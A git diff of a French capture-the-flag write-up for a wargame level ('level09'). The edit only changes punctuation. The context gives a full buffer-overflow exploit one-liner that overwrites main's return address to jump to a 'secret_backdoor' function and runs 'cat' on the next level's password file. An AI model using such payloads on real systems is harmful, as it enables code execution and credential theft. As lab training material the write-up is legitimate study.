@@ -6,6 +6,6 @@ Ainsi, en ecrivant 'a' * 0x28 + '\xff', on va pouvoir ecrire 255 caracteres plus
 
 On remarque que le rip de retour de main est stocké à buffer + 192, on peut donc ecrire l'adresse que l'on souhaite comme adresse de retour.
 
-On """""remarque""""" également la presence de secret_backdoor (......... :). ) dans l'executable qui lit un buffer et l'execute. on peut donc faire ainsi :
+On remarque également la presence de secret_backdoor (...) dans l'executable qui lit un buffer et l'execute. on peut donc faire ainsi :
 
 /home/users/level09/level09 < <(python -c "print 'a' * 0x28 + '\xff' + '\n' + 'b' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\x8c''\x48''\x55''\x55''\x55''\x55' + '\x00' * 2 + '\ncat /home/users/end/.pass'")
